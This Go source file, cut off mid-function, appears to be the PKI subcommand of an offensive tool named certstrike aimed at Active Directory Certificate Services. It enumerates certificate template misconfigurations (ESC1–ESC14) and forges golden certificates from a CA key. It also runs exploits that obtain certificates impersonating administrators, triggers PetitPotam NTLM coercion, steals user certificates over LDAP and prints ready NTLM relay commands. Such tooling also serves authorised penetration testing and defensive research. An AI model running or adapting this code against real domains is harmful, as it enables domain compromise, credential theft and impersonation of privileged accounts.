package main

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"os"
	"strings"

	"github.com/loudmumble/certstrike/pkg/pki"
	"github.com/spf13/cobra"
)

var pkiCmd = &cobra.Command{
	Use:   "pki",
	Short: "Advanced Certificate/PKI attack toolkit",
	Long: `ADCS enumeration (ESC1-ESC14), golden certificate forging, ESC exploitation, PFX import, and engagement reporting.

Examples:
  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass
  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --ldaps
  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --json
  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --stealth
  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user --hash aad3b435b51404eeaad3b435b51404ee
  certstrike pki --esc 1 --template VulnTemplate --upn admin@corp.local --target-dc dc01.corp.local --domain corp.local -u user -p pass
  certstrike pki --esc 7 --ca CorpCA --upn admin@corp.local --target-dc dc01.corp.local --domain corp.local -u user -p pass
  certstrike pki --esc 8 --template Machine --target-dc dc01.corp.local --domain corp.local -u user -p pass --listener-ip 10.0.0.5
  certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt
  certstrike pki --report --format markdown --output findings.md --target-dc dc01.corp.local --domain corp.local -u user -p pass
  certstrike pki --theft all
  certstrike pki --import-pfx cert.pfx`,
	RunE: func(cmd *cobra.Command, args []string) error {
		doEnum, _ := cmd.Flags().GetBool("enum")
		doForge, _ := cmd.Flags().GetBool("forge")
		exploit, _ := cmd.Flags().GetString("esc")
		if exploit == "" {
			exploit, _ = cmd.Flags().GetString("exploit") // legacy
		}
		doAutoDetect, _ := cmd.Flags().GetBool("auto-detect")
		importPFX, _ := cmd.Flags().GetString("import-pfx")
		doReport, _ := cmd.Flags().GetBool("report")
		certTheft, _ := cmd.Flags().GetString("theft")
		if certTheft == "" {
			certTheft, _ = cmd.Flags().GetString("cert-theft") // legacy
		}

		// Count how many actions are requested
		actionCount := 0
		if doEnum { actionCount++ }
		if doForge { actionCount++ }
		if exploit != "" { actionCount++ }
		if doAutoDetect { actionCount++ }
		if importPFX != "" { actionCount++ }
		if doReport { actionCount++ }
		if certTheft != "" { actionCount++ }

		if actionCount == 0 {
			return cmd.Help()
		}
		if actionCount > 1 {
			return fmt.Errorf("specify only one action at a time (--enum, --esc, --forge, --auto-detect, --report, --theft, --import-pfx)")
		}

		if certTheft != "" {
			// Accept bare numbers: --theft 1 → theft1
			if len(certTheft) <= 2 && certTheft[0] >= '0' && certTheft[0] <= '9' {
				certTheft = "theft" + certTheft
			}
			// THEFT4 is automated via LDAP — run real extraction if credentials provided
			if strings.EqualFold(certTheft, "theft4") {
				cfg := buildADCSConfig(cmd)
				if cfg.TargetDC != "" && cfg.Domain != "" && (cfg.Kerberos || cfg.Username != "") {
					outputDir, _ := cmd.Flags().GetString("output")
					if outputDir == "" {
						outputDir = "theft4_certs"
					}
					_, err := pki.ExtractUserCertificatesLDAP(cfg, outputDir)
					return err
				}
				// Fall through to guidance if no credentials
			}
			pki.PrintCertTheftPlaybook(certTheft)
			return nil
		}
		if importPFX != "" {
			return runImportPFX(cmd, importPFX)
		}
		if doReport {
			return runReport(cmd)
		}
		if doAutoDetect {
			return runAutoDetect(cmd)
		}
		if exploit != "" {
			return runExploit(cmd, exploit)
		}
		if doEnum {
			return runEnumerate(cmd)
		}
		if doForge {
			return runForge(cmd)
		}
		return nil
	},
}

func buildADCSConfig(cmd *cobra.Command) *pki.ADCSConfig {
	targetDC, _ := cmd.Flags().GetString("target-dc")
	domain, _ := cmd.Flags().GetString("domain")
	username, _ := cmd.Flags().GetString("username")
	password, _ := cmd.Flags().GetString("password")
	hash, _ := cmd.Flags().GetString("hash")
	useTLS, _ := cmd.Flags().GetBool("ldaps")
	useStartTLS, _ := cmd.Flags().GetBool("start-tls")
	outputJSON, _ := cmd.Flags().GetBool("json")
	stealth, _ := cmd.Flags().GetBool("stealth")
	kerberos, _ := cmd.Flags().GetBool("kerberos")
	ccache, _ := cmd.Flags().GetString("ccache")
	keytabPath, _ := cmd.Flags().GetString("keytab")
	kdcIP, _ := cmd.Flags().GetString("dc-ip")

	return &pki.ADCSConfig{
		TargetDC:    targetDC,
		Domain:      domain,
		Username:    username,
		Password:    password,
		Hash:        hash,
		UseTLS:      useTLS,
		UseStartTLS: useStartTLS,
		OutputJSON:  outputJSON,
		Stealth:     stealth,
		Kerberos:    kerberos,
		CCache:      ccache,
		Keytab:      keytabPath,
		KDCIP:       kdcIP,
	}
}

func runEnumerate(cmd *cobra.Command) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("--target-dc and --domain are required for enumeration")
	}
	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
	}

	// JSON mode: use EnumerateAll for structured output
	if cfg.OutputJSON {
		result, err := pki.EnumerateAll(cfg)
		if err != nil {
			return fmt.Errorf("enumeration failed: %w", err)
		}
		data, err := json.MarshalIndent(result, "", "  ")
		if err != nil {
			return fmt.Errorf("marshal JSON: %w", err)
		}
		fmt.Println(string(data))
		return nil
	}

	templates, err := pki.EnumerateTemplates(cfg)
	if err != nil {
		return fmt.Errorf("enumeration failed: %w", err)
	}

	fmt.Printf("\n[+] Found %d certificate templates:\n\n", len(templates))
	for i, tmpl := range templates {
		vulns := "none"
		if len(tmpl.ESCVulns) > 0 {
			vulns = strings.Join(tmpl.ESCVulns, ", ")
		}
		fmt.Printf("  %d. %-30s  ESC: %-20s  Score: %d\n", i+1, tmpl.Name, vulns, tmpl.ESCScore)
		if tmpl.EnrolleeSuppliesSubject {
			fmt.Println("     ⚠  Enrollee Supplies Subject: YES")
		}
		if tmpl.AuthenticationEKU {
			fmt.Println("     ⚠  Authentication EKU: YES")
		}
		if !tmpl.RequiresManagerApproval {
			fmt.Println("     ⚠  Manager Approval: NO")
		}
		for _, f := range tmpl.ESC4Findings {
			fmt.Printf("     ⚠  ESC4: Trustee %s has %s (mask=0x%08x)\n", f.Trustee, strings.Join(f.Rights, ", "), f.AccessMask)
		}
	}

	// ESC2: Any Purpose EKU templates
	fmt.Println("\n[*] Scanning for ESC2 (Any Purpose EKU templates)...")
	esc2Findings, err := pki.ScanESC2(cfg)
	if err != nil {
		fmt.Printf("[!] ESC2 scan failed: %v\n", err)
	} else if len(esc2Findings) == 0 {
		fmt.Println("[+] ESC2: No Any Purpose EKU templates found.")
	} else {
		fmt.Printf("\n[!] ESC2 VULNERABLE — %d finding(s):\n\n", len(esc2Findings))
		for _, f := range esc2Findings {
			fmt.Printf("    Template: %s\n", f.TemplateName)
			fmt.Printf("    EKUs:     %s\n", strings.Join(f.EKUs, ", "))
			fmt.Println()
		}
	}

	// ESC3: Enrollment Agent templates
	fmt.Println("\n[*] Scanning for ESC3 (Enrollment Agent templates)...")
	esc3Findings, err := pki.ScanESC3(cfg)
	if err != nil {
		fmt.Printf("[!] ESC3 scan failed: %v\n", err)
	} else if len(esc3Findings) == 0 {
		fmt.Println("[+] ESC3: No Enrollment Agent templates found.")
	} else {
		fmt.Printf("\n[!] ESC3 VULNERABLE — %d finding(s):\n\n", len(esc3Findings))
		for _, f := range esc3Findings {
			fmt.Printf("    Template:           %s\n", f.TemplateName)
			fmt.Printf("    Enrollment Agent:   %v\n", f.EnrollmentAgentEKU)
			fmt.Println()
		}
	}

	// ESC5: CA object ACL inspection via nTSecurityDescriptor parsing
	fmt.Println("\n[*] Scanning CA objects for ESC5 (dangerous ACLs on CA itself)...")
	esc5Findings, err := pki.ScanESC5(cfg)
	if err != nil {
		fmt.Printf("[!] ESC5 scan failed: %v\n", err)
	} else if len(esc5Findings) == 0 {
		fmt.Println("[+] ESC5: No dangerous CA ACLs found.")
	} else {
		fmt.Printf("\n[!] ESC5 VULNERABLE — %d finding(s):\n\n", len(esc5Findings))
		for _, f := range esc5Findings {
			fmt.Printf("    CA:      %s\n", f.CAName)
			fmt.Printf("    DN:      %s\n", f.CADN)
			fmt.Printf("    Trustee: %s\n", f.Trustee)
			fmt.Printf("    Rights:  %s  (mask=0x%08x)\n", strings.Join(f.Rights, ", "), f.AccessMask)
			fmt.Println()
		}
	}

	// ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 on enrollment service
	fmt.Println("\n[*] Scanning for ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2 on CA)...")
	esc6Findings, err := pki.ScanESC6(cfg)
	if err != nil {
		fmt.Printf("[!] ESC6 scan failed: %v\n", err)
	} else if len(esc6Findings) == 0 {
		fmt.Println("[+] ESC6: No CAs with EDITF_ATTRIBUTESUBJECTALTNAME2 enabled.")
	} else {
		fmt.Printf("\n[!] ESC6 VULNERABLE — %d finding(s):\n\n", len(esc6Findings))
		for _, f := range esc6Findings {
			fmt.Printf("    CA:        %s\n", f.CAName)
			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
			if len(f.Templates) > 0 {
				fmt.Printf("    Templates: %s\n", strings.Join(f.Templates, ", "))
			}
			fmt.Printf("    Exploit:   certstrike pki --esc 6 --template <ANY_TEMPLATE> --upn administrator@%s --target-dc %s --domain %s -u <user> -p <pass>\n", cfg.Domain, cfg.TargetDC, cfg.Domain)
			fmt.Println()
		}
	}

	// ESC7: Vulnerable CA ACLs (ManageCA / ManageCertificates)
	fmt.Println("\n[*] Scanning for ESC7 (vulnerable CA ACLs)...")
	esc7Findings, err := pki.ScanESC7(cfg)
	if err != nil {
		fmt.Printf("[!] ESC7 scan failed: %v\n", err)
	} else if len(esc7Findings) == 0 {
		fmt.Println("[+] ESC7: No CAs with exploitable ManageCA/ManageCertificates ACLs.")
	} else {
		fmt.Printf("\n[!] ESC7 VULNERABLE — %d finding(s):\n\n", len(esc7Findings))
		for _, f := range esc7Findings {
			fmt.Printf("    CA:                  %s\n", f.CAName)
			fmt.Printf("    Trustee (SID):       %s\n", f.Trustee)
			fmt.Printf("    ManageCA:            %v\n", f.ManageCA)
			fmt.Printf("    ManageCertificates:  %v\n", f.ManageCertificates)
			fmt.Printf("    Access Mask:         0x%08x\n", f.AccessMask)
			fmt.Printf("    Exploit:   certstrike pki --esc 7 --ca %q --upn administrator@%s --target-dc %s --domain %s\n", f.CAName, cfg.Domain, cfg.TargetDC, cfg.Domain)
			fmt.Println()
		}
	}

	// ESC8: NTLM relay to AD CS web enrollment
	fmt.Println("\n[*] Scanning for ESC8 (NTLM relay to web enrollment)...")
	esc8Findings, err := pki.ScanESC8(cfg)
	if err != nil {
		fmt.Printf("[!] ESC8 scan failed: %v\n", err)
	} else if len(esc8Findings) == 0 {
		fmt.Println("[+] ESC8: No vulnerable web enrollment endpoints found.")
	} else {
		fmt.Printf("\n[!] ESC8 VULNERABLE — %d finding(s):\n\n", len(esc8Findings))
		for _, f := range esc8Findings {
			fmt.Printf("    CA:        %s\n", f.CAName)
			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
			fmt.Printf("    Endpoint:  %s\n", f.HTTPEndpoint)
			fmt.Printf("    NTLM:      %v\n", f.NTLMEnabled)
			fmt.Printf("    Templates: %s\n", strings.Join(f.Templates, ", "))
			fmt.Printf("    Exploit:   ntlmrelayx.py -t %scertfnsh.asp -smb2support --adcs --template <TEMPLATE>\n", f.HTTPEndpoint)
			fmt.Println()
		}
	}

	// ESC11: NTLM relay to AD CS RPC interface
	fmt.Println("\n[*] Scanning for ESC11 (NTLM relay to RPC interface)...")
	esc11Findings, err := pki.ScanESC11(cfg)
	if err != nil {
		fmt.Printf("[!] ESC11 scan failed: %v\n", err)
	} else if len(esc11Findings) == 0 {
		fmt.Println("[+] ESC11: All CAs enforce RPC encryption.")
	} else {
		fmt.Printf("\n[!] ESC11 VULNERABLE — %d finding(s):\n\n", len(esc11Findings))
		for _, f := range esc11Findings {
			fmt.Printf("    CA:        %s\n", f.CAName)
			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
			fmt.Printf("    Encrypts:  %v\n", f.EnforcesEncryption)
			fmt.Printf("    Exploit:   certipy-ad relay -target rpc://%s -ca %q\n", f.CAHostname, f.CAName)
			fmt.Println()
		}
	}

	// ESC12: DCOM interface abuse on CA with network HSM key storage
	fmt.Println("\n[*] Scanning for ESC12 (DCOM interface abuse on CA)...")
	esc12Findings, err := pki.ScanESC12(cfg)
	if err != nil {
		fmt.Printf("[!] ESC12 scan failed: %v\n", err)
	} else if len(esc12Findings) == 0 {
		fmt.Println("[+] ESC12: No CAs with accessible DCOM endpoints found.")
	} else {
		fmt.Printf("\n[!] ESC12 VULNERABLE — %d finding(s):\n\n", len(esc12Findings))
		for _, f := range esc12Findings {
			fmt.Printf("    CA:        %s\n", f.CAName)
			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
			fmt.Printf("    DCOM:      %v\n", f.DCOMAccessible)
			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
			fmt.Printf("    Exploit:   certipy-ad relay -target dcom://%s -ca %q\n", f.CAHostname, f.CAName)
			fmt.Printf("               # Or: impacket-ntlmrelayx -t dcom://%s --adcs -smb2support\n", f.CAHostname)
			fmt.Println()
		}
	}

	// ESC9: CT_FLAG_NO_SECURITY_EXTENSION — UPN spoofing via missing requester SID
	fmt.Println("\n[*] Scanning for ESC9 (CT_FLAG_NO_SECURITY_EXTENSION)...")
	esc9Findings, err := pki.ScanESC9(cfg)
	if err != nil {
		fmt.Printf("[!] ESC9 scan failed: %v\n", err)
	} else if len(esc9Findings) == 0 {
		fmt.Println("[+] ESC9: No vulnerable templates found.")
	} else {
		fmt.Printf("\n[!] ESC9 VULNERABLE — %d finding(s):\n\n", len(esc9Findings))
		for _, f := range esc9Findings {
			enforcement := "unknown"
			switch f.BindingEnforcement {
			case 0:
				enforcement = "Disabled (EXPLOITABLE)"
			case 1:
				enforcement = "Compatibility mode (EXPLOITABLE)"
			case 2:
				enforcement = "Full enforcement (mitigated)"
			}
			fmt.Printf("    Template:                %s\n", f.TemplateName)
			fmt.Printf("    NO_SECURITY_EXTENSION:   %v\n", f.HasNoSecurityExtension)
			fmt.Printf("    Authentication EKU:      %v\n", f.AuthenticationEKU)
			fmt.Printf("    Binding Enforcement:     %d (%s)\n", f.BindingEnforcement, enforcement)
			fmt.Println()
		}
	}

	// ESC10: Weak certificate mapping methods
	fmt.Println("\n[*] Scanning for ESC10 (weak certificate mapping methods)...")
	esc10Findings, err := pki.ScanESC10(cfg)
	if err != nil {
		fmt.Printf("[!] ESC10 scan failed: %v\n", err)
	} else if len(esc10Findings) == 0 {
		fmt.Println("[+] ESC10: Certificate mapping methods are not weak.")
	} else {
		fmt.Printf("\n[!] ESC10 VULNERABLE — %d finding(s):\n\n", len(esc10Findings))
		for _, f := range esc10Findings {
			enforcement := "unknown"
			switch f.BindingEnforcement {
			case 0:
				enforcement = "Disabled (EXPLOITABLE)"
			case 1:
				enforcement = "Compatibility mode (EXPLOITABLE)"
			case 2:
				enforcement = "Full enforcement (mitigated)"
			}
			fmt.Printf("    Mapping Methods:     0x%02x\n", f.MappingMethods)
			fmt.Printf("    UPN Mapping:         %v\n", f.UPNMappingEnabled)
			fmt.Printf("    S4U2Self Mapping:    %v\n", f.S4U2SelfEnabled)
			fmt.Printf("    Binding Enforcement: %d (%s)\n", f.BindingEnforcement, enforcement)
			fmt.Printf("    Vulnerable Templates (%d): %s\n", len(f.VulnerableTemplates), strings.Join(f.VulnerableTemplates, ", "))
			fmt.Println()
		}
	}

	// ESC13: OID group link abuse via msDS-OIDToGroupLink
	fmt.Println("\n[*] Scanning for ESC13 (OID group link abuse)...")
	esc13Findings, err := pki.ScanESC13(cfg)
	if err != nil {
		fmt.Printf("[!] ESC13 scan failed: %v\n", err)
	} else if len(esc13Findings) == 0 {
		fmt.Println("[+] ESC13: No linked issuance policy OIDs found.")
	} else {
		fmt.Printf("\n[!] ESC13 VULNERABLE — %d finding(s):\n\n", len(esc13Findings))
		for _, f := range esc13Findings {
			fmt.Printf("    Template:     %s\n", f.TemplateName)
			fmt.Printf("    Policy OID:   %s\n", f.IssuancePolicyOID)
			fmt.Printf("    Linked Group: %s (%s)\n", f.LinkedGroupName, f.LinkedGroup)
			fmt.Println()
		}
	}

	// ESC14: Weak explicit mappings via altSecurityIdentities
	fmt.Println("\n[*] Scanning for ESC14 (weak explicit mappings via altSecurityIdentities)...")
	esc14Findings, err := pki.ScanESC14(cfg)
	if err != nil {
		fmt.Printf("[!] ESC14 scan failed: %v\n", err)
	} else if len(esc14Findings) == 0 {
		fmt.Println("[+] ESC14: No schema v1 templates with weak mapping found.")
	} else {
		fmt.Printf("\n[!] ESC14 VULNERABLE — %d finding(s):\n\n", len(esc14Findings))
		for _, f := range esc14Findings {
			enforcement := "unknown"
			switch f.BindingEnforcement {
			case 0:
				enforcement = "Disabled (EXPLOITABLE)"
			case 1:
				enforcement = "Compatibility mode (EXPLOITABLE)"
			case 2:
				enforcement = "Full enforcement (mitigated)"
			}
			fmt.Printf("    Template:            %s\n", f.TemplateName)
			fmt.Printf("    Schema Version:      %d\n", f.SchemaVersion)
			fmt.Printf("    Explicit Mapping:    %v\n", f.AllowsExplicitMapping)
			fmt.Printf("    Strong Mapping Req:  %v\n", f.StrongMappingRequired)
			fmt.Printf("    Binding Enforcement: %d (%s)\n", f.BindingEnforcement, enforcement)
			fmt.Println()
		}
	}

	return nil
}

func runForge(cmd *cobra.Command) error {
	upn, _ := cmd.Flags().GetString("upn")
	caKeyPath, _ := cmd.Flags().GetString("ca-key")
	caCertPath, _ := cmd.Flags().GetString("ca-cert")
	output, _ := cmd.Flags().GetString("output")

	if upn == "" {
		return fmt.Errorf("--upn is required for certificate forging (e.g. --upn administrator@corp.local)")
	}
	if !strings.Contains(upn, "@") {
		return fmt.Errorf("--upn must be a full UPN (user@domain), got %q", upn)
	}
	if output == "" {
		// Default to UPN username (e.g., administrator@corp.local → administrator)
		if idx := strings.Index(upn, "@"); idx > 0 {
			output = upn[:idx]
		} else {
			output = upn
		}
	}

	basePath := output
	for _, ext := range []string{".pem", ".crt", ".key", ".pfx"} {
		basePath = strings.TrimSuffix(basePath, ext)
	}

	// Golden Certificate mode: both --ca-key and --ca-cert provided
	// Uses ForgeGoldenCertificate to sign with real CA key and chain to real CA cert
	if caKeyPath != "" && caCertPath != "" {
		fmt.Println("[!] Golden Certificate mode: signing with real CA key + cert")
		caCert, caKey, err := pki.LoadCACertAndKey(caCertPath, caKeyPath)
		if err != nil {
			return fmt.Errorf("load CA material: %w", err)
		}

		cert, certKey, err := pki.ForgeGoldenCertificate(caKey, caCert, upn)
		if err != nil {
			return fmt.Errorf("forge golden certificate: %w", err)
		}

		if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
			return fmt.Errorf("write certificate: %w", err)
		}
		pfxPassword, _ := cmd.Flags().GetString("pfx-password")
		if err := pki.WritePFX(cert, certKey, basePath+".pfx", pfxPassword); err != nil {
			fmt.Printf("[!] PFX export failed: %v\n", err)
		}

		outputJSON, _ := cmd.Flags().GetBool("json")
		if outputJSON {
			data, _ := json.MarshalIndent(map[string]string{
				"type":     "golden_certificate",
				"subject":  cert.Subject.CommonName,
				"issuer":   cert.Issuer.CommonName,
				"upn":      upn,
				"serial":   cert.SerialNumber.Text(16),
				"cert_path": basePath + ".crt",
				"key_path":  basePath + ".key",
				"pfx_path":  basePath + ".pfx",
			}, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		fmt.Printf("[+] Golden certificate (CA-signed) written to %s.crt / %s.pfx\n", basePath, basePath)
		fmt.Printf("    Subject: %s\n", cert.Subject.CommonName)
		fmt.Printf("    Issuer:  %s\n", cert.Issuer.CommonName)
		fmt.Printf("    UPN: %s\n", upn)
		fmt.Printf("    Serial: %s\n", cert.SerialNumber.Text(16))
		fmt.Printf("    Valid: %s to %s\n", cert.NotBefore.Format("2006-01-02"), cert.NotAfter.Format("2006-01-02"))
		return nil
	}

	// Self-signed mode: original ForgeCertificate behavior
	var caKey crypto.PrivateKey

	if caKeyPath != "" {
		data, err := os.ReadFile(caKeyPath)
		if err != nil {
			return fmt.Errorf("read CA key: %w", err)
		}
		block, _ := pem.Decode(data)
		if block == nil {
			return fmt.Errorf("no PEM block found in %s", caKeyPath)
		}
		// Try PKCS8 first (handles RSA, ECDSA, Ed25519), then legacy formats
		pkcs8Key, err := x509.ParsePKCS8PrivateKey(block.Bytes)
		if err == nil {
			caKey = pkcs8Key
		} else {
			// Try PKCS1 RSA
			rsaKey, rsaErr := x509.ParsePKCS1PrivateKey(block.Bytes)
			if rsaErr == nil {
				caKey = rsaKey
			} else {
				// Try EC
				ecKey, ecErr := x509.ParseECPrivateKey(block.Bytes)
				if ecErr != nil {
					return fmt.Errorf("parse CA key: PKCS8: %v, PKCS1: %v, EC: %v", err, rsaErr, ecErr)
				}
				caKey = ecKey
			}
		}
	} else {
		fmt.Println("[*] No --ca-key provided, generating ephemeral RSA key...")
		rsaKey, err := rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			return fmt.Errorf("generate CA key: %w", err)
		}
		caKey = rsaKey
	}

	cert, certKey, err := pki.ForgeCertificate(caKey, upn)
	if err != nil {
		return fmt.Errorf("forge certificate: %w", err)
	}

	if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
		return fmt.Errorf("write certificate: %w", err)
	}
	pfxPassword, _ := cmd.Flags().GetString("pfx-password")
	if err := pki.WritePFX(cert, certKey, basePath+".pfx", pfxPassword); err != nil {
		fmt.Printf("[!] PFX export failed: %v\n", err)
	}

	outputJSON, _ := cmd.Flags().GetBool("json")
	if outputJSON {
		data, _ := json.MarshalIndent(map[string]string{
			"type":     "self_signed_certificate",
			"subject":  cert.Subject.CommonName,
			"upn":      upn,
			"serial":   cert.SerialNumber.String(),
			"cert_path": basePath + ".crt",
			"key_path":  basePath + ".key",
			"pfx_path":  basePath + ".pfx",
		}, "", "  ")
		fmt.Println(string(data))
		return nil
	}
	fmt.Printf("[+] Golden certificate written to %s.crt / %s.pfx\n", basePath, basePath)
	fmt.Printf("    Subject: %s\n", cert.Subject.CommonName)
	fmt.Printf("    UPN: %s\n", upn)
	fmt.Printf("    Serial: %s\n", cert.SerialNumber.String())
	fmt.Printf("    Valid: %s to %s\n", cert.NotBefore.Format("2006-01-02"), cert.NotAfter.Format("2006-01-02"))
	return nil
}

func runExploit(cmd *cobra.Command, exploit string) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("--target-dc and --domain are required")
	}
	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
	}

	templateName, _ := cmd.Flags().GetString("template")
	upn, _ := cmd.Flags().GetString("upn")
	output, _ := cmd.Flags().GetString("output")

	// ESC5/8/10/11/12/14 are scan-only — they don't require --template or --upn
	escID := strings.ToLower(strings.TrimPrefix(strings.ToLower(exploit), "esc"))
	isScanOnly := escID == "5" || escID == "8" || escID == "10" || escID == "11" || escID == "12" || escID == "14"

	if templateName == "" && !isScanOnly {
		return fmt.Errorf("--template is required for exploitation (e.g. --template User)")
	}
	if upn == "" && !isScanOnly {
		return fmt.Errorf("--upn is required for exploitation (e.g. --upn administrator@%s)", cfg.Domain)
	}
	if upn != "" && !strings.Contains(upn, "@") {
		return fmt.Errorf("--upn must be a full UPN (user@domain), got %q — try %s@%s", upn, upn, cfg.Domain)
	}
	if output == "" {
		// Default to UPN username (e.g., administrator@corp.local → administrator)
		if idx := strings.Index(upn, "@"); idx > 0 {
			output = upn[:idx]
		} else {
			output = upn
		}
	}

	var cert *x509.Certificate
	var certKey crypto.Signer
	var err error

	switch escID {
	case "1":
		cert, certKey, err = pki.ExploitESC1(cfg, templateName, upn)
	case "2":
		cert, certKey, err = pki.ExploitESC2(cfg, templateName, upn)
	case "3":
		cert, certKey, err = pki.ExploitESC3(cfg, templateName, upn)
	case "4":
		cert, certKey, err = pki.ExploitESC4(cfg, templateName, upn)
	case "6":
		cert, certKey, err = pki.ExploitESC6(cfg, templateName, upn)
	case "7":
		caName, _ := cmd.Flags().GetString("ca")
		if caName == "" {
			return fmt.Errorf("--ca is required for ESC7 exploitation (target CA name)")
		}
		cert, certKey, err = pki.ExploitESC7(cfg, caName, upn)
	case "9":
		attackerDN, _ := cmd.Flags().GetString("attacker-dn")
		if attackerDN == "" {
			return fmt.Errorf("--attacker-dn is required for ESC9 exploitation (attacker's LDAP DN)")
		}
		cert, certKey, err = pki.ExploitESC9(cfg, templateName, attackerDN, upn)
	case "13":
		cert, certKey, err = pki.ExploitESC13(cfg, templateName, upn)
	case "8":
		// ESC8 is a relay attack — scan for the endpoint and print the ntlmrelayx command
		esc8Findings, scanErr := pki.ScanESC8(cfg)
		if scanErr != nil {
			return fmt.Errorf("ESC8 scan failed: %w", scanErr)
		}
		if len(esc8Findings) == 0 {
			return fmt.Errorf("no vulnerable web enrollment endpoints found")
		}
		if cfg.OutputJSON {
			data, _ := json.MarshalIndent(esc8Findings, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		fmt.Println("\n[!] ESC8 relay attack — use ntlmrelayx to relay coerced NTLM auth:")
		for _, f := range esc8Findings {
			fmt.Printf("\n    Target: %s (%s)\n", f.CAName, f.CAHostname)
			fmt.Printf("    ntlmrelayx.py -t %scertfnsh.asp -smb2support --adcs --template %s\n", f.HTTPEndpoint, templateName)
		}
		// If --listener-ip is set, trigger PetitPotam coercion automatically
		listenerIP, _ := cmd.Flags().GetString("listener-ip")
		listenerPort, _ := cmd.Flags().GetInt("listener-port")
		if listenerIP != "" {
			if listenerPort > 0 {
				fmt.Printf("\n[*] Triggering PetitPotam coercion: %s → %s:%d (WebDAV/HTTP)\n", cfg.TargetDC, listenerIP, listenerPort)
				fmt.Printf("[*] ntlmrelayx on pivot: ntlmrelayx.py -t %scertfnsh.asp --adcs --template %s -smb-port %d\n",
					esc8Findings[0].HTTPEndpoint, templateName, listenerPort)
			} else {
				fmt.Printf("\n[*] Triggering PetitPotam coercion: %s → %s (SMB/445)\n", cfg.TargetDC, listenerIP)
			}
			if coerceErr := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIP, listenerPort, pki.CoercePetitPotam, cfg); coerceErr != nil {
				fmt.Printf("[!] PetitPotam coercion failed: %v\n", coerceErr)
				fmt.Printf("[*] Manual: PetitPotam.py %s %s\n", listenerIP, cfg.TargetDC)
			}
		} else {
			fmt.Printf("\n[*] To auto-trigger coercion, add: --listener-ip <YOUR_RELAY_IP>\n")
			fmt.Printf("[*] For non-admin pivot, add: --listener-port <PORT> (uses WebDAV for HTTP auth on custom port)\n")
			fmt.Printf("[*] Or manually: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
		}
		fmt.Println("\n[*] After obtaining the certificate via relay:")
		fmt.Printf("    certipy-ad auth -pfx <cert.pfx> -dc-ip <DC_IP> -domain %s\n", cfg.Domain)
		return nil
	case "12":
		// ESC12 is a DCOM-based attack — scan for accessible DCOM endpoints and print the relay command
		esc12Findings, scanErr := pki.ScanESC12(cfg)
		if scanErr != nil {
			return fmt.Errorf("ESC12 scan failed: %w", scanErr)
		}
		if len(esc12Findings) == 0 {
			return fmt.Errorf("no CAs with accessible DCOM endpoints found")
		}
		if cfg.OutputJSON {
			data, _ := json.MarshalIndent(esc12Findings, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		fmt.Println("\n[!] ESC12 DCOM relay attack — relay auth to ICertRequest DCOM interface:")
		for _, f := range esc12Findings {
			fmt.Printf("\n    Target: %s (%s)\n", f.CAName, f.CAHostname)
			fmt.Printf("    certipy-ad relay -target dcom://%s -ca %q -template %s\n",
				f.CAHostname, f.CAName, templateName)
			fmt.Printf("    # Then coerce auth: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
		}
		fmt.Println("\n[*] After obtaining the certificate via DCOM relay:")
		fmt.Printf("    certipy-ad auth -pfx <cert.pfx> -dc-ip <DC_IP> -domain %s\n", cfg.Domain)
		return nil
	case "5":
		// ESC5 is a CA-level ACL finding — scan for vulnerable PKI object ACLs
		esc5Findings, scanErr := pki.ScanESC5(cfg)
		if scanErr != nil {
			return fmt.Errorf("ESC5 scan failed: %w", scanErr)
		}
		if len(esc5Findings) == 0 {
			fmt.Println("[*] No vulnerable PKI object ACLs found (ESC5).")
			return nil
		}
		if cfg.OutputJSON {
			data, _ := json.MarshalIndent(esc5Findings, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		fmt.Println("\n[!] ESC5 — Vulnerable PKI object ACLs on CA:")
		for _, f := range esc5Findings {
			fmt.Printf("\n    CA: %s\n", f.CAName)
			fmt.Printf("    Trustee (SID): %s\n", f.Trustee)
			fmt.Printf("    Rights: %s\n", strings.Join(f.Rights, ", "))
		}
		fmt.Println("\n[*] These ACLs allow modifying CA configuration objects.")
		fmt.Printf("    An attacker with these rights can reconfigure the CA to enable ESC6/ESC7 attacks.\n")
		fmt.Printf("    Next: certstrike pki --esc 7 --ca <CA_NAME> --upn %s --target-dc %s --domain %s -u <user> -p <pass>\n", upn, cfg.TargetDC, cfg.Domain)
		return nil
	case "10":
		// ESC10 is a domain config finding — scan for weak certificate mapping methods
		esc10Findings, scanErr := pki.ScanESC10(cfg)
		if scanErr != nil {
